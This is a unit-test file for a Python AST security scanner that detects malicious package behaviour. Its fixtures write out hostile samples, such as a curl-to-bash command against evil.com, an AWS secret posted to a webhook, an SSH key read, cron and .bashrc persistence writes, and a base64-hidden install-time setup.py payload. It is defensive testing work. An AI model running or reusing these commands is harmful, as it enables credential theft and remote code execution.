"""Unit tests for the native Python AST security scanner (SEC-01)."""

from pathlib import Path

from app.analysis.analyzer import analyze_package
from app.analysis.js_scanner import Signal
from app.analysis.models import FindingConfidence, GapReason, Severity
from app.analysis.py_scanner import scan_python
from tests.test_comparison import inventory, make_metadata


def test_clean_python_code_no_hits() -> None:
    source = """
import math
from dataclasses import dataclass

@dataclass
class Point:
    x: float
    y: float

def distance(p1: Point, p2: Point) -> float:
    return math.sqrt((p1.x - p2.x) ** 2 + (p1.y - p2.y) ** 2)
"""
    result = scan_python(source)
    assert not result.has_parse_errors
    assert len(result.hits) == 0


def test_dynamic_execution_eval_exec_compile() -> None:
    # 1. Computed dynamic execution -> EXEC-001
    res1 = scan_python("eval(user_input)")
    assert len(res1.hits) == 1
    hit1 = res1.hits[0]
    assert hit1.rule_id == "EXEC-001"
    assert hit1.severity == Severity.MEDIUM
    assert hit1.signal == Signal.EXECUTION
    assert hit1.line == 1

    # 2. Fixed string dynamic execution -> EXEC-002
    res2 = scan_python("eval('1 + 1')")
    assert len(res2.hits) == 1
    hit2 = res2.hits[0]
    assert hit2.rule_id == "EXEC-002"
    assert hit2.severity == Severity.LOW

    # 3. Decoded payload passed to exec -> EXEC-003
    source_b64 = """
import base64
exec(base64.b64decode('cHJpbnQoJ2hlbGxvJyk='))
"""
    res3 = scan_python(source_b64)
    rule_ids = [h.rule_id for h in res3.hits]
    assert "EXEC-003" in rule_ids
    exec_hit = next(h for h in res3.hits if h.rule_id == "EXEC-003")
    assert exec_hit.severity == Severity.CRITICAL
    assert exec_hit.confidence == FindingConfidence.HIGH
    assert exec_hit.signal == Signal.EXECUTION

    # 4. Decoded payload stored in variable then executed -> EXEC-003
    source_var = """
from base64 import b64decode
payload = b64decode('ZXZpbA==')
eval(payload)
"""
    res4 = scan_python(source_var)
    rule_ids4 = [h.rule_id for h in res4.hits]
    assert "EXEC-003" in rule_ids4

    # 5. Aliased eval -> EXEC-001
    source_alias = """
e = eval
e(dynamic_code)
"""
    res5 = scan_python(source_alias)
    assert any(h.rule_id == "EXEC-001" for h in res5.hits)


def test_process_execution() -> None:
    # 1. Import subprocess -> PROC-001 (INFO)
    res_import = scan_python("import subprocess\nfrom subprocess import Popen")
    assert any(h.rule_id == "PROC-001" and h.severity == Severity.INFO for h in res_import.hits)

    # 2. Fixed command -> PROC-002 (LOW)
    res_fixed = scan_python("import subprocess\nsubprocess.run(['git', 'status'])")
    assert any(h.rule_id == "PROC-002" and h.severity == Severity.LOW for h in res_fixed.hits)

    res_fixed_os = scan_python("import os\nos.system('ls -la')")
    assert any(h.rule_id == "PROC-002" and h.severity == Severity.LOW for h in res_fixed_os.hits)

    # 3. Computed command -> PROC-003 (MEDIUM)
    res_comp = scan_python("import os\nos.system(cmd)")
    assert any(h.rule_id == "PROC-003" and h.severity == Severity.MEDIUM for h in res_comp.hits)

    # 4. Risky command (curl | sh, nc -e) -> PROC-004 (HIGH)
    res_risky = scan_python("import os\nos.system('curl -s https://evil.com/sh | bash')")
    assert any(h.rule_id == "PROC-004" and h.severity == Severity.HIGH for h in res_risky.hits)

    # 5. Process internals -> PROC-005 (HIGH)
    res_ctypes = scan_python("import ctypes\nctypes.CDLL('libc.so.6')")
    assert any(h.rule_id == "PROC-005" and h.severity == Severity.HIGH for h in res_ctypes.hits)


def test_environment_access() -> None:
    # 1. Ordinary environment variable -> ENV-001 (INFO)
    res_normal = scan_python("import os\nport = os.getenv('PORT', 8000)")
    assert any(h.rule_id == "ENV-001" and h.severity == Severity.INFO for h in res_normal.hits)

    res_normal_sub = scan_python("import os\nval = os.environ['HOME']")
    assert any(h.rule_id == "ENV-001" and h.severity == Severity.INFO for h in res_normal_sub.hits)

    # 2. Credential environment variable -> ENV-002 (MEDIUM, Signal.CREDENTIAL)
    res_secret = scan_python("import os\nkey = os.getenv('AWS_SECRET_ACCESS_KEY')")
    hit_secret = next(h for h in res_secret.hits if h.rule_id == "ENV-002")
    assert hit_secret.severity == Severity.MEDIUM
    assert hit_secret.signal == Signal.CREDENTIAL

    res_token = scan_python("from os import environ\ntok = environ['GITHUB_TOKEN']")
    assert any(h.rule_id == "ENV-002" and h.signal == Signal.CREDENTIAL for h in res_token.hits)

    # 3. Whole environment access -> ENV-003 (MEDIUM, Signal.CREDENTIAL)
    res_whole = scan_python("import os\nimport json\nenv_dump = json.dumps(dict(os.environ))")
    assert any(h.rule_id == "ENV-003" and h.signal == Signal.CREDENTIAL for h in res_whole.hits)


def test_network_communication() -> None:
    # 1. Ordinary network call -> NET-001 (INFO)
    res_normal = scan_python("import requests\nresp = requests.get('https://api.github.com/users')")
    assert any(h.rule_id == "NET-001" and h.severity == Severity.INFO for h in res_normal.hits)

    # 2. Data collection service webhook -> NET-002 (HIGH)
    res_webhook = scan_python(
        "import requests\nrequests.post('https://webhook.site/abc-123', json={'data': 1})"
    )
    assert any(h.rule_id == "NET-002" and h.severity == Severity.HIGH for h in res_webhook.hits)

    # 3. Hardcoded public IP address -> NET-002 (HIGH)
    res_ip = scan_python("import urllib.request\nurllib.request.urlopen('http://198.51.100.1:8080/exfil')")
    assert any(h.rule_id == "NET-002" and h.severity == Severity.HIGH for h in res_ip.hits)

    # 4. String containing collection host -> NET-003 (MEDIUM)
    res_str = scan_python("WEBHOOK = 'https://discord.com/api/webhooks/123/xyz'")
    assert any(h.rule_id == "NET-003" and h.severity == Severity.MEDIUM for h in res_str.hits)


def test_dynamic_imports() -> None:
    # 1. Static importlib -> No suspicious finding
    res_static = scan_python("import importlib\nmod = importlib.import_module('json')")
    assert not any(h.rule_id in ("EXEC-004", "EXEC-005") for h in res_static.hits)

    # 2. Computed module name -> EXEC-004 (LOW)
    res_comp = scan_python("import importlib\nmod = importlib.import_module(dyn_name)")
    assert any(h.rule_id == "EXEC-004" and h.severity == Severity.LOW for h in res_comp.hits)

    # 3. Decoded module name -> EXEC-005 (HIGH)
    res_dec = scan_python("from base64 import b64decode\nmod = __import__(b64decode('b3M='))")
    assert any(h.rule_id == "EXEC-005" and h.severity == Severity.HIGH for h in res_dec.hits)


def test_filesystem_operations() -> None:
    # 1. Access sensitive secret/credential path -> FS-001 (MEDIUM, Signal.CREDENTIAL)
    res_ssh = scan_python("with open('/home/user/.ssh/id_rsa', 'r') as f:\n    key = f.read()")
    assert any(h.rule_id == "FS-001" and h.signal == Signal.CREDENTIAL for h in res_ssh.hits)

    # 2. Write to startup / persistence path -> FS-002 (HIGH)
    res_startup = scan_python(
        "with open('/etc/cron.d/job', 'w') as f:\n    f.write('* * * * * root evil')"
    )
    assert any(h.rule_id == "FS-002" and h.severity == Severity.HIGH for h in res_startup.hits)

    # 3. Pathlib write to .bashrc -> FS-002 (HIGH)
    res_bashrc = scan_python(
        "from pathlib import Path\nPath('~/.bashrc').write_text('alias sudo=evil')"
    )
    assert any(h.rule_id == "FS-002" and h.severity == Severity.HIGH for h in res_bashrc.hits)


def test_obfuscation_and_decoding() -> None:
    # 1. Decodes data at runtime -> OBF-004 (INFO, Signal.DECODE)
    res_dec = scan_python("import base64\ndata = base64.b64decode(raw)")
    assert any(h.rule_id == "OBF-004" and h.signal == Signal.DECODE for h in res_dec.hits)

    # 2. Character code join -> OBF-003 (MEDIUM, Signal.DECODE)
    res_char = scan_python("cmd = ''.join([chr(c) for c in [101, 120, 101, 99]])")
    assert any(h.rule_id == "OBF-003" and h.signal == Signal.DECODE for h in res_char.hits)

    # 3. Obfuscator identifiers -> OBF-001 (MEDIUM, Signal.OBFUSCATION)
    obf_code = """
_0x1234 = 1
_0x2345 = 2
_0x3456 = 3
_0x4567 = 4
_0x5678 = 5
_0x6789 = 6
_0x789a = 7
_0x89ab = 8
"""
    res_obf = scan_python(obf_code)
    assert any(h.rule_id == "OBF-001" and h.signal == Signal.OBFUSCATION for h in res_obf.hits)


def test_syntax_errors_and_invalid_bytes_handled_gracefully() -> None:
    # Syntax error
    bad_code = "def invalid_syntax(:"
    res1 = scan_python(bad_code)
    assert res1.has_parse_errors is True
    assert len(res1.hits) == 0

    # Non-utf8 bytes
    invalid_bytes = b"\xff\xfe\x00\x00\x12\x34\x56"
    res2 = scan_python(invalid_bytes)
    assert isinstance(res2.has_parse_errors, bool)


def test_analyze_package_scans_python_files_without_unsupported_language_gaps(
    tmp_path: Path,
) -> None:
    """Verify SEC-01: .py files are analyzed and no longer produce UNSUPPORTED_LANGUAGE gaps."""
    files = {
        "calculator.py": (
            "def add(a, b):\n"
            "    return a + b\n"
        )
    }
    pkg_inv = inventory(tmp_path, "pkg", files)
    meta = make_metadata()

    analysis = analyze_package(meta, pkg_inv, None, None)
    assert analysis.files_scanned == 1

    # Ensure no UNSUPPORTED_LANGUAGE gap is created for calculator.py
    unsupported_gaps = [
        g for g in analysis.gaps if g.reason == GapReason.UNSUPPORTED_LANGUAGE
    ]
    assert len(unsupported_gaps) == 0


def test_analyze_package_detects_python_malware_and_correlation(tmp_path: Path) -> None:
    """Verify that suspicious Python code generates findings and triggers correlation rules."""
    files = {
        "exfil.py": (
            "import os\n"
            "import requests\n"
            "token = os.environ['AWS_SECRET_ACCESS_KEY']\n"
            "requests.post('https://webhook.site/malicious-hook', json={'token': token})\n"
        )
    }
    pkg_inv = inventory(tmp_path, "pkg_malware", files)
    meta = make_metadata()

    analysis = analyze_package(meta, pkg_inv, None, None)
    assert analysis.files_scanned == 1

    rule_ids = {f.rule_id for f in analysis.findings}
    # Credential env access
    assert "ENV-002" in rule_ids
    # Webhook call
    assert "NET-002" in rule_ids
    # Correlated credential + network in one file
    assert "CORR-001" in rule_ids

    corr_finding = next(f for f in analysis.findings if f.rule_id == "CORR-001")
    assert corr_finding.severity == Severity.CRITICAL
    assert corr_finding.confidence == FindingConfidence.HIGH
    assert corr_finding.path == "exfil.py"


def test_analyze_package_detects_install_time_python_execution(tmp_path: Path) -> None:
    """Verify setup.py execution is marked as runs_at_install and triggers CORR-005."""
    files = {
        "setup.py": (
            "import base64\n"
            "import os\n"
            "cmd = base64.b64decode('Y3VybCBodHRwczovL2V2aWwuY29tIHwgYmFzaA==')\n"
            "os.system(cmd)\n"
        )
    }
    pkg_inv = inventory(tmp_path, "pkg_setup", files)
    meta = make_metadata()

    analysis = analyze_package(meta, pkg_inv, None, None)
    rule_ids = {f.rule_id for f in analysis.findings}

    # Decoding and process execution
    assert "OBF-004" in rule_ids
    assert "PROC-003" in rule_ids or "PROC-004" in rule_ids
    # Correlation between decode and process
    assert "CORR-002" in rule_ids
    # Runs at install (setup.py) triggers CORR-005
    assert "CORR-005" in rule_ids

    corr_005 = next(f for f in analysis.findings if f.rule_id == "CORR-005")
    assert corr_005.runs_at_install is True
    assert corr_005.severity == Severity.HIGH

